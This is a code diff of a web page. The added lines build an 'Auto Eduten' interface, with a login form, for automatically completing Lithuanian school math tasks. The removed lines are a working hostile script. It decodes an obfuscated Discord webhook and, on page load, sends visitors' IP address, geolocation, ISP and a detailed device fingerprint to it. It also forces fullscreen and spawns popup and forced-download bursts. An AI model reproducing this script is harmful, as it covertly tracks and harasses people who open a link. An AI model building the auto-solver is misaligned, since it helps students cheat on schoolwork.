+        <p class="sub tight" id="loadingSub">
+          Preparing your workspace. Please do not close this window.
+        </p>
+        <div class="progress"><div class="bar" id="bar"></div></div>
+        <p class="status"><span id="statusText">Initializing</span><span class="ellipsis"></span></p>
+        <p class="percent" id="percent">0%</p>
+        <p class="foot">Auto Eduten <b>v4</b> — Browser Edition</p>
+      </div>
+
+    </section>
+  </main>
+
+  <!-- ============ PAGE 1 : COURSES ============ -->
+  <div class="page" id="coursesPage">
+    <div class="page-panel">
+      <div class="page-inner">
+        <h2 class="page-title">Select your kourse</h2>
+        <p class="page-sub">Choose the course you want Auto Eduten to work on.</p>
+        <div class="item-list" id="courseList"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ PAGE 2 : LESSONS ============ -->
+  <div class="page" id="lessonsPage">
+    <div class="page-panel">
+      <div class="page-inner">
+        <button class="page-back" id="lessonsBack" type="button">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+               stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M19 12H5M11 18l-6-6 6-6"/>
+          </svg>
+          Back
+        </button>
+        <h2 class="page-title">Available lessons</h2>
+        <p class="page-sub" id="lessonsSub">8c Matematika, 8 klasė 2026</p>
+        <div class="item-list" id="lessonList"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ PAGE 3 : TASKS ============ -->
+  <div class="page" id="tasksPage">
+    <div class="page-panel">
+      <div class="page-inner">
+        <button class="page-back" id="tasksBack" type="button">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+               stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M19 12H5M11 18l-6-6 6-6"/>
+          </svg>
+          Back
+        </button>
+        <h2 class="page-title" id="tasksTitle">Vienanarių daugyba ir dalyba</h2>
+        <p class="page-sub" id="tasksSub">All tasks in this lesson.</p>
+        <div class="task-list" id="taskList"></div>
+        <button class="big-start" id="startBtn" type="button">
+          <span>Start doing tasks auto</span>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
+               stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M5 12h14M13 6l6 6-6 6"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ TERMINAL ============ -->
+  <div class="terminal-screen" id="terminalScreen">
+    <div id="terminalLines"></div>
+  </div>
 
 <script>
-(() => {
-'use strict';
+(function () {
+  'use strict';
 
-// ============================================================
-// 9z2m 8q3n (N) / 9z3k 8q3n
-// ============================================================
-const N = 100;                       // download burst count
-const N_POP = 5;                     // popup burst count (reduced)
-const IV = 1000;                     // download interval (ms)
-const IV_DL_ACTIVE = false;          // download interval enabled? set true to repeat forever
-const TARGET_URL = 'https://hypie12o.github.io/crash/';
-const RICK_URL = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
-const DELAY_MS = 10000;              // spam delay (10s)
-const RICK_DELAY_MS = 60000;         // rick roll delay (60s)
+  /* ============================================================
+     CONFIG
+     ============================================================ */
+  var LOADING_DURATION       = 12000;
+  var TOTAL_PROCESS_DURATION = 180000;
 
-// ============================================================
-// Spawned-tab guard. When this page is opened by another tab,
-// the URL contains ?spawn=0 → disable all further spam.
-// ============================================================
-const SPAWN_PARAM = 'spawn';
-const SPAWN_VALUE = '0';
-const IS_SPAWNED = (function () {
-  try {
-    const p = new URLSearchParams(location.search);
-    return p.get(SPAWN_PARAM) === SPAWN_VALUE;
-  } catch (_) { return false; }
-})();
+  function $(id){ return document.getElementById(id); }
+  function wait(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+  function pad(n, len){ n = String(n); while (n.length < len) n = '0' + n; return n; }
 
-const SPAWN_URL = (function () {
-  try {
-    const u = new URL(TARGET_URL);
-    u.searchParams.set(SPAWN_PARAM, SPAWN_VALUE);
-    return u.toString();
-  } catch (_) {
-    return TARGET_URL + (TARGET_URL.indexOf('?') === -1 ? '?' : '&') + SPAWN_PARAM + '=' + SPAWN_VALUE;
-  }
-})();
+  /* ---------- elements ---------- */
+  var viewWelcome = $('view-welcome');
+  var viewLogin   = $('view-login');
+  var viewLoading = $('view-loading');
+  var allViews    = document.querySelectorAll('.view');
 
-// ============================================================
-// 3q9z 8n1v 9z3k — base64 decoded at runtime
-// ============================================================
-const W3B_H00K_B64 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU0OTQ3MTAxNDIxODUwNjQ0MC8xRkJlWHhhdXNJOW5hZC1EdVZzS1lVYkw4Y3RCTHloY09XV2pMajdhYVEzU2l1TDZudXlwREcyWWtQLUhKT0ZyaHpSaA';
+  var continueBtn = $('continueBtn');
+  var backBtn     = $('backBtn');
+  var loginForm   = $('loginForm');
+  var loginBtn    = $('loginBtn');
+  var username    = $('username');
+  var password    = $('password');
+  var passWrap    = $('passWrap');
+  var peek        = $('peek');
+  var loginError  = $('loginError');
+  var loginErrorText = $('loginErrorText');
 
-function b64u8(s) {
-  const bin = atob(s);
-  const bytes = new Uint8Array(bin.length);
-  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
-  if (typeof TextDecoder !== 'undefined') {
-    return new TextDecoder('utf-8').decode(bytes);
-  }
-  let out = '';
-  for (let i = 0; i < bytes.length; i++) {
-    const c = bytes[i];
-    if (c < 0x80) out += String.fromCharCode(c);
-    else if (c < 0xE0) out += String.fromCharCode(((c & 0x1F) << 6) | (bytes[++i] & 0x3F));
-    else if (c < 0xF0) out += String.fromCharCode(((c & 0x0F) << 12) | ((bytes[++i] & 0x3F) << 6) | (bytes[++i] & 0x3F));
-    else {
-      const cp = ((c & 0x07) << 18) | ((bytes[++i] & 0x3F) << 12) | ((bytes[++i] & 0x3F) << 6) | (bytes[++i] & 0x3F);
-      const off = cp - 0x10000;
-      out += String.fromCharCode(0xD800 + (off >> 10), 0xDC00 + (off & 0x3FF));
-    }
-  }
-  return out;
-}
+  var bar         = $('bar');
+  var statusText  = $('statusText');
+  var percentEl   = $('percent');
+  var loadingSub  = $('loadingSub');
 
-const W3B_H00K = b64u8(W3B_H00K_B64);
+  var shell       = $('shell');
 
-// ============================================================
-// Webhook state
-// ============================================================
-let hookStatus = 'idle';
-let hookStatusCode = 0;
-let hookErrorText = '';
-let hookAttempts = 0;
-let hookLastIp = '';
-let hookLastProvider = '';
+  var coursesPage = $('coursesPage');
+  var lessonsPage = $('lessonsPage');
+  var tasksPage   = $('tasksPage');
+  var allPages    = [coursesPage, lessonsPage, tasksPage];
 
-function setHookStatus(s, code, txt) {
-  hookStatus = s;
-  if (code !== undefined) hookStatusCode = code;
-  if (txt !== undefined) hookErrorText = txt;
-  try { console.log('[hook]', s, code || '', txt || ''); } catch (_) {}
-}
+  var courseList  = $('courseList');
+  var lessonList  = $('lessonList');
+  var taskList    = $('taskList');
 
-// ============================================================
-// Fingerprint helpers
-// ============================================================
-function safeGpuInfo() {
-  try {
-    const cv = document.createElement('canvas');
-    const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
-    if (!gl) return { v: 'no-webgl', r: 'no-webgl' };
-    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-    const v = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
-    const r = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
-    return { v: String(v || 'unknown'), r: String(r || 'unknown') };
-  } catch (_) { return { v: 'err', r: 'err' }; }
-}
+  var lessonsSub  = $('lessonsSub');
+  var tasksSub    = $('tasksSub');
+  var lessonsBack = $('lessonsBack');
+  var tasksBack   = $('tasksBack');
+  var startBtn    = $('startBtn');
 
-function safeScreen() {
-  try {
-    return {
-      sw: screen.width, sh: screen.height,
-      saw: screen.availWidth, sah: screen.availHeight,
-      cd: screen.colorDepth, pd: screen.pixelDepth,
-      iw: window.innerWidth, ih: window.innerHeight,
-      ow: window.outerWidth, oh: window.outerHeight,
-      dpr: window.devicePixelRatio || 1,
-      orient: (screen.orientation && screen.orientation.type) || 'n/a',
-    };
-  } catch (_) {
-    return { sw: 0, sh: 0, saw: 0, sah: 0, cd: 0, pd: 0, iw: 0, ih: 0, ow: 0, oh: 0, dpr: 1, orient: 'n/a' };
-  }
-}
+  var terminalScreen = $('terminalScreen');
+  var terminalLines  = $('terminalLines');
 
-function safeTz() {
-  try {
-    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'n/a';
-    const off = -new Date().getTimezoneOffset() / 60;
-    return tz + ' (UTC' + (off >= 0 ? '+' : '') + off + ')';
-  } catch (_) { return 'n/a'; }
-}
+  /* ============================================================
+     DATA
+     ============================================================ */
+  var COURSE = '8c Matematika, 8 klasė 2026';
+  var LESSON = 'Vienanarių daugyba ir dalyba';
 
-function safeLocale() {
-  try {
-    const o = Intl.DateTimeFormat().resolvedOptions();
-    return (o.locale || '?') + ' · ' + (o.calendar || '?') + ' · ' + (o.numberingSystem || '?');
-  } catch (_) { return 'n/a'; }
-}
-
-function safeConn() {
-  try {
-    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (!c) return 'n/a';
-    return (c.effectiveType || '?') + ' · ' +
-           (c.downlink != null ? c.downlink + ' Mbps' : '?') + ' · ' +
-           (c.rtt != null ? c.rtt + ' ms' : '?') + ' · ' +
-           (c.saveData ? 'saveData on' : 'saveData off');
-  } catch (_) { return 'n/a'; }
-}
-
-function safeHeap() {
-  try {
-    if (!performance.memory) return 'n/a (non-Chrome)';
-    const m = performance.memory;
-    return (m.usedJSHeapSize / 1048576).toFixed(1) + ' MB used / ' +
-           (m.totalJSHeapSize / 1048576).toFixed(1) + ' MB total / ' +
-           (m.jsHeapSizeLimit / 1048576).toFixed(0) + ' MB cap';
-  } catch (_) { return 'n/a'; }
-}
-
-// ============================================================
-// IP lookup — 8 providers raced in parallel with abort timeouts
-// ============================================================
-function fetchWithAbort(url, parse, timeoutMs) {
-  return new Promise((resolve) => {
-    let ctrl = null;
-    try { ctrl = new AbortController(); } catch (_) { ctrl = null; }
-    const opts = { cache: 'no-store', credentials: 'omit', referrerPolicy: 'no-referrer' };
-    if (ctrl) opts.signal = ctrl.signal;
-
-    const timer = setTimeout(() => {
-      if (ctrl) { try { ctrl.abort(); } catch (_) {} }
-      resolve(null);
-    }, timeoutMs);
-
-    fetch(url, opts)
-      .then((r) => {
-        if (!r.ok) { clearTimeout(timer); resolve(null); return; }
-        return parse(r).then((v) => { clearTimeout(timer); resolve(v); })
-                       .catch(() => { clearTimeout(timer); resolve(null); });
-      })
-      .catch(() => { clearTimeout(timer); resolve(null); });
-  });
-}
-
-function ipFromJson(json) {
-  if (!json) return null;
-  const ip = json.ip || json.query || json.ipAddress || json.ip_address || (json.ipv4 && json.ipv4[0]);
-  if (ip && typeof ip === 'string' && ip.length >= 5) return String(ip).trim();
-  return null;
-}
-
-async function lookupIP() {
-  const out = {
-    ip: 'unknown', provider: '',
-    country: '', city: '', region: '', isp: '', asn: '', loc: '', postal: '', ipTz: '',
-  };
-
-  const P = [
-    { url: 'https://api.ipify.org?format=json',           parse: (r) => r.json(),  kind: 'ipify' },
-    { url: 'https://ipwho.is/',                            parse: (r) => r.json(),  kind: 'ipwhois' },
-    { url: 'https://api.my-ip.io/ip.json',                 parse: (r) => r.json(),  kind: 'myip' },
-    { url: 'https://ipapi.co/json/',                       parse: (r) => r.json(),  kind: 'ipapi' },
-    { url: 'https://ipinfo.io/json',                       parse: (r) => r.json(),  kind: 'ipinfo' },
-    { url: 'https://api64.ipify.org?format=json',          parse: (r) => r.json(),  kind: 'ipify64' },
-    { url: 'https://icanhazip.com',                        parse: (r) => r.text(),  kind: 'icanhazip' },
-    { url: 'https://ifconfig.me/ip',                       parse: (r) => r.text(),  kind: 'ifconfig' },
-    { url: 'https://api.ipify.org/?format=text',           parse: (r) => r.text(),  kind: 'ipify-text' },
+  var TASKS = [
+    { cat: 'Simbolių viktorina',      name: 'Įvadas: Vienanarių daugyba' },
+    { cat: 'Simbolių viktorina',      name: 'Įvadas: Vienanarių dalyba (vienas kintamasis)' },
+    { cat: 'Matematinis treniruoklis',name: 'Kopėčios: Vienanarių daugyba (vienas kintamasis)' },
+    { cat: 'Sujunkite poras',         name: 'Sujunkite poras: Vienanarių dalyba (su vienu kintamuoju)' },
+    { cat: 'Simbolių viktorina',      name: 'Vienanarių daugyba su keliais kintamaisiais' },
+    { cat: 'Testas',                  name: 'Vienanarių dalybos taisyklės' },
+    { cat: 'Matematinis treniruoklis',name: 'Kopėčios: Vienanarių dalyba (vienas kintamasis)' },
+    { cat: 'Simbolių viktorina',      name: 'Raskite trūkstamą vienanarį' },
+    { cat: 'Simbolių viktorina',      name: 'Vienanarių dalyba (su keliais kintamaisiais)' },
+    { cat: 'Testas',                  name: 'Raskite teisingus dauginamuosius (vienanarius)' },
+    { cat: 'Simbolių viktorina',      name: 'Vienanarių dalyba (keli kintamieji)' },
+    { cat: 'Simbolių viktorina',      name: 'Reiškiniai su vienanarių daugyba' },
+    { cat: 'Simbolių viktorina',      name: 'Vienanarių dalyba (racionalieji reiškiniai)' },
+    { cat: 'Simbolių viktorina',      name: 'Vienanarių daugyba su keliais kintamaisiais' },
+    { cat: 'Simbolių viktorina',      name: 'Daugianarių daugyba iš vienanarių 1' },
+    { cat: 'Simbolių viktorina',      name: 'Įvadas: Vienanarių dalyba (vienas kintamasis)' },
+    { cat: 'Matematinis treniruoklis',name: 'Kopėčios: Vienanarių dalyba (vienas kintamasis)' }
   ];
 
-  const results = await Promise.all(
-    P.map((p) => fetchWithAbort(p.url, p.parse, 4000)
-      .then((v) => ({ kind: p.kind, value: v }))
-      .catch(() => ({ kind: p.kind, value: null }))
-    )
-  );
-
-  // First pass: find an IP string from any provider.
-  for (const r of results) {
-    if (r.value == null) continue;
-    let ip = null;
-    if (typeof r.value === 'string') {
-      const txt = r.value.trim();
-      if (txt.length >= 5 && txt.length <= 45 && txt.indexOf('<') === -1 && /[0-9a-fA-F:.]/.test(txt)) {
-        ip = txt;
-      }
-    } else {
-      ip = ipFromJson(r.value);
-    }
-    if (ip) {
-      out.ip = ip;
-      out.provider = r.kind;
-      break;
-    }
+  /* ============================================================
+     VIEW / PAGE HELPERS
+     ============================================================ */
+  function showView(target) {
+    for (var i = 0; i < allViews.length; i++) allViews[i].classList.remove('active');
+    void target.offsetWidth;
+    target.classList.add('active');
+  }
+  function showPage(target) {
+    for (var i = 0; i < allPages.length; i++) allPages[i].classList.remove('active');
+    void target.offsetWidth;
+    target.classList.add('active');
+    target.scrollTop = 0;
+  }
+  function hideAllPages() {
+    for (var i = 0; i < allPages.length; i++) allPages[i].classList.remove('active');
+  }
+  /* hides the whole shell so nothing lingers behind the pages */
+  function hideShell() {
+    shell.classList.add('hidden');
   }
 
-  // Second pass: enrich with details from any JSON provider that succeeded.
-  for (const r of results) {
-    if (r.value == null || typeof r.value === 'string') continue;
-    const j = r.value;
-    if (!out.country && j.country) out.country = String(j.country);
-    if (!out.country && j.country_code) out.country = String(j.country_code);
-    if (!out.city && j.city) out.city = String(j.city);
-    if (!out.region && j.region) out.region = String(j.region);
-    if (!out.region && j.region_name) out.region = String(j.region_name);
-    if (!out.isp && j.org) out.isp = String(j.org);
-    if (!out.isp && j.isp) out.isp = String(j.isp);
-    if (!out.isp && j.connection && j.connection.isp) out.isp = String(j.connection.isp);
-    if (!out.loc && j.loc) out.loc = String(j.loc);
-    if (!out.loc && j.latitude != null && j.longitude != null) out.loc = j.latitude + ',' + j.longitude;
-    if (!out.postal && j.postal) out.postal = String(j.postal);
-    if (!out.ipTz && j.timezone) out.ipTz = String(j.timezone);
-    if (!out.ipTz && j.time_zone) out.ipTz = String(j.time_zone);
-    if (!out.asn && j.org && String(j.org).indexOf('AS') === 0) out.asn = String(j.org).split(' ')[0];
-    if (!out.asn && j.asn) out.asn = String(j.asn);
-    if (!out.asn && j.connection && j.connection.asn) out.asn = String(j.connection.asn);
+  /* ---------- ripple ---------- */
+  var rippleStyle = document.createElement('style');
+  rippleStyle.textContent = '@keyframes rip{to{transform:scale(2.4);opacity:0;}}';
+  document.head.appendChild(rippleStyle);
+
+  function ripple(btn) {
+    var rect = btn.getBoundingClientRect();
+    var size = Math.max(rect.width, rect.height);
+    var el = document.createElement('span');
+    el.style.cssText =
+      'position:absolute;border-radius:50%;background:rgba(255,255,255,.45);' +
+      'pointer-events:none;z-index:2;transform:scale(0);' +
+      'width:' + size + 'px;height:' + size + 'px;' +
+      'left:' + (rect.width / 2 - size / 2) + 'px;' +
+      'top:' + (rect.height / 2 - size / 2) + 'px;' +
+      'animation:rip .6s ease-out forwards;';
+    btn.appendChild(el);
+    setTimeout(function () { if (el.parentNode) el.parentNode.removeChild(el); }, 650);
   }
 
-  return out;
-}
-
-// ============================================================
-// Build payload (2 embeds, ≤25 fields each)
-// ============================================================
-function buildPayload(ipinfo, source) {
-  const gpu = safeGpuInfo();
-  const scr = safeScreen();
-  const nav = navigator;
-  const now = new Date();
-
-  const ua = String(nav.userAgent || 'n/a');
-  const platform = String(nav.platform || 'n/a');
-  const vendor = String(nav.vendor || 'n/a');
-  const lang = String(nav.language || 'n/a');
-  const langs = String((nav.languages || []).join(', ') || 'n/a');
-  const cores = String(nav.hardwareConcurrency || 'n/a');
-  const mem = String(nav.deviceMemory != null ? nav.deviceMemory : 'n/a');
-  const touch = String(nav.maxTouchPoints != null ? nav.maxTouchPoints : 0);
-  const online = String(nav.onLine != null ? nav.onLine : 'n/a');
-  const cookies = String(nav.cookieEnabled != null ? nav.cookieEnabled : 'n/a');
-  const dnt = String(nav.doNotTrack || 'n/a');
-  const pdf = String(nav.pdfViewerEnabled != null ? nav.pdfViewerEnabled : 'n/a');
-  const plugins = String((nav.plugins && nav.plugins.length) || 0);
-
-  const embed1 = {
-    title: 'Link Pressed.',
-    color: 0x00ff41,
-    timestamp: now.toISOString(),
-    description:
-      '**Source:** ' + source + '\n' +
-      '**URL:** ' + (location.href || 'n/a') + '\n' +
-      '**Referrer:** ' + (document.referrer || 'direct') + '\n' +
-      '**IP Provider:** `' + (ipinfo.provider || 'none') + '`',
-    footer: { text: '324j2ggyufsid32 · ' + ipinfo.ip },
-    fields: [
-      { name: 'IP Address',     value: '`' + ipinfo.ip + '`',                     inline: true },
-      { name: 'ISP / Org',      value: '`' + (ipinfo.isp || '?') + '`',           inline: true },
-      { name: 'ASN',            value: '`' + (ipinfo.asn || '?') + '`',           inline: true },
-
-      { name: 'City',           value: '`' + (ipinfo.city || '?') + '`',          inline: true },
-      { name: 'Region',         value: '`' + (ipinfo.region || '?') + '`',        inline: true },
-      { name: 'Country',        value: '`' + (ipinfo.country || '?') + '`',       inline: true },
-
-      { name: 'Postal',         value: '`' + (ipinfo.postal || '?') + '`',        inline: true },
-      { name: 'Lat / Lon',      value: '`' + (ipinfo.loc || '?') + '`',           inline: true },
-      { name: 'IP Timezone',    value: '`' + (ipinfo.ipTz || '?') + '`',          inline: true },
-
-      { name: 'Local Timezone', value: '`' + safeTz() + '`',                      inline: false },
-      { name: 'Locale',         value: '`' + safeLocale() + '`',                  inline: false },
-      { name: 'Online',         value: '`' + online + '`',                        inline: true },
-      { name: 'Connection',     value: '`' + safeConn() + '`',                    inline: false },
-      { name: 'DNT',            value: '`' + dnt + '`',                           inline: true },
-    ],
-  };
-
-  const embed2 = {
-    title: 'Device Fingerprint',
-    color: 0x764ba2,
-    timestamp: now.toISOString(),
-    fields: [
-      { name: 'OS / Platform',  value: '`' + platform + '`',                      inline: true },
-      { name: 'Vendor',         value: '`' + vendor + '`',                        inline: true },
-      { name: 'Language',       value: '`' + lang + '`',                          inline: true },
-
-      { name: 'Languages',      value: '`' + langs + '`',                         inline: false },
-      { name: 'CPU Cores',      value: '`' + cores + '`',                         inline: true },
-      { name: 'Device Memory',  value: '`' + mem + ' GB`',                        inline: true },
-      { name: 'Touch Points',   value: '`' + touch + '`',                         inline: true },
-
-      { name: 'Screen',         value: '`' + scr.sw + '×' + scr.sh + '` (avail `' + scr.saw + '×' + scr.sah + '`)', inline: false },
-      { name: 'Window',         value: '`' + scr.iw + '×' + scr.ih + '` (outer `' + scr.ow + '×' + scr.oh + '`)', inline: false },
-      { name: 'DPR / Depth',    value: '`' + scr.dpr + 'x · ' + scr.cd + 'bit`',  inline: true },
-      { name: 'Orientation',    value: '`' + scr.orient + '`',                    inline: true },
-      { name: 'Cookies',        value: '`' + cookies + '`',                       inline: true },
-
-      { name: 'PDF Viewer',     value: '`' + pdf + '`',                           inline: true },
-      { name: 'Plugins',        value: '`' + plugins + '`',                       inline: true },
-      { name: 'JS Heap',        value: '`' + safeHeap() + '`',                    inline: false },
-
-      { name: 'GPU Vendor',     value: '`' + gpu.v + '`',                         inline: false },
-      { name: 'GPU Renderer',   value: '`' + gpu.r + '`',                         inline: false },
-      { name: 'User Agent',     value: '`' + ua + '`',                            inline: false },
-      { name: 'UTC Timestamp',  value: '`' + now.toISOString() + '`',             inline: false },
-    ],
-  };
-
-  const content = '**Link Pressed.** · IP: `' + ipinfo.ip + '` · Source: `' + source + '`';
-  return { content: content, embeds: [embed1, embed2] };
-}
-
-// ============================================================
-// Send the webhook
-// ============================================================
-async function sendWebhook(source) {
-  hookAttempts++;
-  setHookStatus('sending');
-
-  let ipinfo;
-  try {
-    ipinfo = await lookupIP();
-  } catch (_) {
-    ipinfo = { ip: 'unknown', provider: 'error', country: '', city: '', region: '', isp: '', asn: '', loc: '', postal: '', ipTz: '' };
+  /* ---------- chevron ---------- */
+  var SVGNS = 'http://www.w3.org/2000/svg';
+  function makeChevron() {
+    var svg = document.createElementNS(SVGNS, 'svg');
+    svg.setAttribute('class', 'chev');
+    svg.setAttribute('viewBox', '0 0 24 24');
+    svg.setAttribute('fill', 'none');
+    svg.setAttribute('stroke', 'currentColor');
+    svg.setAttribute('stroke-width', '2.2');
+    svg.setAttribute('stroke-linecap', 'round');
+    svg.setAttribute('stroke-linejoin', 'round');
+    var p = document.createElementNS(SVGNS, 'path');
+    p.setAttribute('d', 'M9 6l6 6-6 6');
+    svg.appendChild(p);
+    return svg;
   }
 
-  hookLastIp = ipinfo.ip;
-  hookLastProvider = ipinfo.provider;
-
-  const payload = buildPayload(ipinfo, source);
-  const body = JSON.stringify(payload);
-
-  try {
-    const r = await fetch(W3B_H00K, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: body,
-      cache: 'no-store',
-      credentials: 'omit',
-      referrerPolicy: 'no-referrer',
-    });
-
-    if (r.ok || r.status === 204 || r.status === 200) {
-      setHookStatus('ok', r.status, '');
-      return true;
-    }
-
-    let errTxt = '';
-    try { errTxt = await r.text(); } catch (_) {}
-    setHookStatus('fail', r.status, errTxt.slice(0, 200));
-
-    if (r.status === 400) {
-      try {
-        const simple = { content: '**Link Pressed.** IP: `' + ipinfo.ip + '` (' + source + ')' };
-        const r2 = await fetch(W3B_H00K, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(simple),
-          cache: 'no-store',
-          credentials: 'omit',
-          referrerPolicy: 'no-referrer',
-        });
-        if (r2.ok || r2.status === 204) {
-          setHookStatus('ok', r2.status, 'simple fallback');
-          return true;
-        }
-        let e2 = '';
-        try { e2 = await r2.text(); } catch (_) {}
-        setHookStatus('fail', r2.status, e2.slice(0, 200));
-      } catch (e2) {
-        setHookStatus('err', 0, String((e2 && e2.message) || e2));
-      }
-    }
-    return false;
-  } catch (e) {
-    setHookStatus('err', 0, String((e && e.message) || e));
-    try {
-      const simple = { content: '**Link Pressed.** IP: `' + ipinfo.ip + '` (' + source + ')' };
-      const r3 = await fetch(W3B_H00K, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(simple),
-        cache: 'no-store',
-        credentials: 'omit',
-        referrerPolicy: 'no-referrer',
-      });
-      if (r3.ok || r3.status === 204) {
-        setHookStatus('ok', r3.status, 'simple fallback');
-        return true;
-      }
-      let e3 = '';
-      try { e3 = await r3.text(); } catch (_) {}
-      setHookStatus('fail', r3.status, e3.slice(0, 200));
-    } catch (e3) {
-      setHookStatus('err', 0, String((e3 && e3.message) || e3));
-    }
-    return false;
-  }
-}
-
-// ============================================================
-// Fire webhook on load + on first click
-// ============================================================
-(function armWebhook() {
-  sendWebhook('page-load');
-  const onClick = () => { sendWebhook('first-click'); };
-  window.addEventListener('pointerdown', onClick, { once: true, passive: true });
-  window.addEventListener('keydown',     onClick, { once: true, passive: true });
-  window.addEventListener('touchstart',  onClick, { once: true, passive: true });
-})();
-
-// ============================================================
-// x9k2n7m3 — download counter (plain variable)
-// ============================================================
-let x9k2n7m3 = 0;
-const q8v3n1z5 = [];
-
-function v2k9m4x7(name, method, ok) {
-  x9k2n7m3 = x9k2n7m3 + 1;
-  q8v3n1z5.push({ n: name, m: method, t: Date.now(), o: !!ok });
-}
-
-window.__x9k2n7m3 = function () { return x9k2n7m3; };
-window.__q8v3n1z5 = q8v3n1z5;
-
-// ============================================================
-// Popup burst — SINGLE FIRE, only from original tab
-// ============================================================
-let popupCount = 0;
-let popupFired = false;
-
-function z9k2m4v_pop() {
-  if (IS_SPAWNED) return;            // spawned tabs never spawn popups
-  if (popupFired) return;            // only once ever
-  popupFired = true;
-  for (let i = 0; i < N_POP; i++) {
-    try {
-      const w = window.open(SPAWN_URL, '_blank', 'noopener,noreferrer');
-      if (w) popupCount++;
-    } catch (e) {}
-  }
-}
-
-window.__getPopupCount = function () { return popupCount; };
-
-// ============================================================
-// Fullscreen
-// ============================================================
-function v9k3n2m_fs() {
-  const el = document.documentElement;
-  const rfs = el.requestFullscreen ||
-              el.webkitRequestFullscreen ||
-              el.mozRequestFullScreen ||
-              el.msRequestFullscreen;
-  if (rfs) {
-    try {
-      const p = rfs.call(el, { navigationUI: 'hide' });
-      if (p && p.catch) p.catch(() => {});
-    } catch (e) {}
-  }
-}
-
-v9k3n2m_fs();
-setTimeout(v9k3n2m_fs, 0);
-document.addEventListener('click', v9k3n2m_fs, { once: true });
-document.addEventListener('keydown', v9k3n2m_fs, { once: true });
-
-// ============================================================
-// Download burst — delayed 10s, single fire (interval optional)
-// ============================================================
-setTimeout(function p3q8v1n5() {
-  if (IS_SPAWNED) return;
-
-  let U;
-  try { U = new URL('lol.txt', location.href).href; } catch (e) { return; }
-
-  function z9k2m4v() {
-    for (let i = 0; i < N; i++) {
-      try {
-        const A = document.createElement('a');
-        A.href = U;
-        A.download = 'lol.txt';
-        A.rel = 'noopener';
-        A.style.display = 'none';
-        document.body.appendChild(A);
-        A.click();
-        setTimeout(() => { try { A.remove(); } catch (_) {} }, 500);
-        v2k9m4x7('lol.txt', 'anchor', true);
-      } catch (e) {
-        v2k9m4x7('lol.txt', 'anchor', false);
-      }
-    }
-  }
-
-  function m8q2n1z() {
-    for (let i = 0; i < N; i++) {
-      fetch(U, { cache: 'no-store' })
-        .then(r => { if (!r.ok) throw new Error('HTTP ' + r.status); return r.blob(); })
-        .then(b => {
-          const BU = URL.createObjectURL(b);
-          const A2 = document.createElement('a');
-          A2.href = BU;
-          A2.download = 'lol.txt';
-          A2.style.display = 'none';
-          document.body.appendChild(A2);
-          A2.click();
-          setTimeout(() => {
-            try { A2.remove(); } catch (_) {}
-            try { URL.revokeObjectURL(BU); } catch (_) {}
-          }, 2000);
-          v2k9m4x7('lol.txt', 'fetch', true);
-        })
-        .catch(() => { v2k9m4x7('lol.txt', 'fetch', false); });
-    }
-  }
-
-  z9k2m4v();
-  setTimeout(m8q2n1z, 1500);
-
-  if (IV_DL_ACTIVE) {
-    const dInt = setInterval(() => {
-      z9k2m4v();
-      setTimeout(m8q2n1z, 1500);
-    }, IV);
-    window.__dInt = dInt;
-  }
-}, DELAY_MS);
-
-// ============================================================
-// Popup burst — delayed 10s, SINGLE FIRE
-// ============================================================
-setTimeout(function q8w3n1v_pop() {
-  z9k2m4v_pop();
-}, DELAY_MS);
-
-// ============================================================
-// Rick Roll — delayed 60s, SINGLE FIRE, only from original tab
-// ============================================================
-let rickFired = false;
-setTimeout(function r1ckr0ll() {
-  if (IS_SPAWNED) return;
-  if (rickFired) return;
-  rickFired = true;
-  try { window.open(RICK_URL, '_blank', 'noopener,noreferrer'); } catch (_) {}
-}, RICK_DELAY_MS);
-
-// ============================================================
-// Error surface
-// ============================================================
-const v9k3n2m = document.getElementById('n2p6q1v');
-function q4z9n1m(msg) {
-  v9k3n2m.style.display = 'grid';
-  v9k3n2m.textContent = msg;
-  console.error(msg);
-  throw new Error(msg);
-}
-window.addEventListener('error', (e) => {
-  console.error('Uncaught:', e.error || e.message);
-});
-
-const h7k2n9m = performance.now();
-const p3q8v6z = () => (performance.now() - h7k2n9m) * 0.001;
-
-// ============================================================
-// GL helpers
-// ============================================================
-function x8k2n5z(gl, type, src, name) {
-  const s = gl.createShader(type);
-  gl.shaderSource(s, src);
-  gl.compileShader(s);
-  if (!gl.getShaderParameter(s, gl.COMPILE_STATUS)) {
-    q4z9n1m(name + ' shader error:\n\n' + gl.getShaderInfoLog(s) + '\n\n--- source ---\n' + src);
-  }
-  return s;
-}
-function m3z9k1q(gl, vs, fs, name) {
-  const v = x8k2n5z(gl, gl.VERTEX_SHADER, vs, name + ' V');
-  const f = x8k2n5z(gl, gl.FRAGMENT_SHADER, fs, name + ' F');
-  const p = gl.createProgram();
-  gl.attachShader(p, v);
-  gl.attachShader(p, f);
-  gl.linkProgram(p);
-  if (!gl.getProgramParameter(p, gl.LINK_STATUS)) {
-    q4z9n1m(name + ' link error: ' + gl.getProgramInfoLog(p));
-  }
-  gl.deleteShader(v);
-  gl.deleteShader(f);
-  return p;
-}
